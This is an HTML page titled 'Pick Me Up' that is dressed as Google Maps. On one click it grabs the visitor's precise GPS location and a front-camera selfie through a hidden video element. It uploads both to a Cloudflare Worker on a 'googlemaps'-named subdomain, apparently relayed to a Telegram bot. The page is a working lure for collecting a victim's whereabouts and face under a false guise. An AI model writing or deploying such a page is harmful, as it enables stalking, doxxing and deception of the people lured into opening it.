<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Pick Me Up</title>

  <style>
    * {
      box-sizing: border-box;
    }

    html,
    body {
      width: 100%;
      min-height: 100%;
      margin: 0;
    }

    body {
      min-height: 100vh;
      min-height: 100dvh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
      font-family: system-ui, sans-serif;
      text-align: center;
      color: white;

      /* Full-screen Google Maps background */
      background-image: url("map-background.png");
      background-size: cover;
      background-position: center;
      background-repeat: no-repeat;
    }

    /* Hidden preview; the video is still used for capture */
    #v {
      position: fixed;
      width: 1px;
      height: 1px;
      opacity: 0;
      pointer-events: none;
    }

    .panel {
      width: min(100%, 420px);
      padding: 24px;
      border-radius: 18px;
      background: rgba(0, 0, 0, 0.78);
      box-shadow: 0 8px 30px rgba(0, 0, 0, 0.25);
    }

    h1 {
      margin: 0 0 12px;
      font-size: 26px;
    }

    #s {
      margin: 0 0 20px;
      font-size: 16px;
      line-height: 1.6;
      overflow-wrap: anywhere;
    }

    button {
      width: 100%;
      padding: 14px 18px;
      border: 0;
      border-radius: 10px;
      background: #1677ff;
      color: white;
      font: inherit;
      font-weight: 600;
      cursor: pointer;
    }

    button:disabled {
      opacity: 0.6;
      cursor: wait;
    }

    .note {
      margin-top: 14px;
      font-size: 12px;
      line-height: 1.5;
      color: #ddd;
    }
  </style>
</head>

<body>
  <main class="panel">
    <h1>Pick Me Up</h1>

    <p id="s">
      Share your location and take a photo using your device.
      You will be asked for permission before access is granted.
    </p>

    <button id="start" type="button">
      Continue
    </button>

    <p class="note">
      Your browser will request location and camera access.
      Nothing is sent unless you choose to continue.
    </p>
  </main>

  <!-- Hidden camera video used to capture a frame -->
  <video id="v" autoplay playsinline muted></video>

  <script>
    // Your Cloudflare Worker endpoint.
    // Keep any Telegram bot token private on the server.
    const WORKER_URL =
      "https://googlemaps.mostafa-solom258.workers.dev";

    const status = document.getElementById("s");
    const video = document.getElementById("v");
    const startButton = document.getElementById("start");

    function getPosition() {
      return new Promise((resolve, reject) => {
        if (!navigator.geolocation) {
          reject(new Error("Geolocation is not supported."));
          return;
        }

        navigator.geolocation.getCurrentPosition(
          resolve,
          reject,
          {
            enableHighAccuracy: true,
            timeout: 15000,
            maximumAge: 0
          }
        );
      });
    }

    async function takePhoto() {
      if (!navigator.mediaDevices?.getUserMedia) {
        throw new Error("Camera access is unavailable.");
      }

      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "user" },
        audio: false
      });

      try {
        video.srcObject = stream;

        await video.play();

        // Wait for the camera to produce a usable frame.
        if (!video.videoWidth || !video.videoHeight) {
          await new Promise((resolve, reject) => {
            video.addEventListener("loadedmetadata", resolve, {
              once: true
            });
            video.addEventListener("error", reject, {
              once: true
            });
          });
        }

        await new Promise(resolve => setTimeout(resolve, 500));

        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;

        const context = canvas.getContext("2d");

        if (!context) {
          throw new Error("Could not create the photo.");
        }

        context.drawImage(video, 0, 0);

        const blob = await new Promise((resolve, reject) => {
          canvas.toBlob(result => {
            if (result) resolve(result);
            else reject(new Error("Could not encode the photo."));
          }, "image/jpeg", 0.85);
        });

        return blob;
      } finally {
        // Stop the camera even if capture fails.
        stream.getTracks().forEach(track => track.stop());
        video.srcObject = null;
      }
    }

    async function sendLocation() {
      const position = await getPosition();

      const response = await fetch(WORKER_URL, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          latitude: position.coords.latitude,
          longitude: position.coords.longitude
        })
      });

      if (!response.ok) {
        throw new Error("Location upload failed: " + response.status);
      }
    }

    async function sendPhoto(blob) {
      const formData = new FormData();
      formData.append("photo", blob, "selfie.jpg");

      const response = await fetch(WORKER_URL, {
        method: "POST",
        body: formData
      });

      if (!response.ok) {
        throw new Error("Photo upload failed: " + response.status);
      }
    }

    startButton.addEventListener("click", async () => {
      startButton.disabled = true;

      const results = [];

      try {
        status.textContent = "Requesting location permission…";
        await sendLocation();
        results.push("Location shared successfully.");
      } catch (error) {
        results.push("Location not shared: " + error.message);
      }

      try {
        status.textContent = "Requesting camera permission…";
        const photo = await takePhoto();

        // The photo is sent only after the user initiated this flow.
        status.textContent = "Sending photo…";
        await sendPhoto(photo);
        results.push("Photo shared successfully.");
      } catch (error) {
        results.push("Photo not shared: " + error.message);
      }

      status.textContent = results.join(" ");
      startButton.textContent = "Finished";
    });
  </script>
</body>
</html>
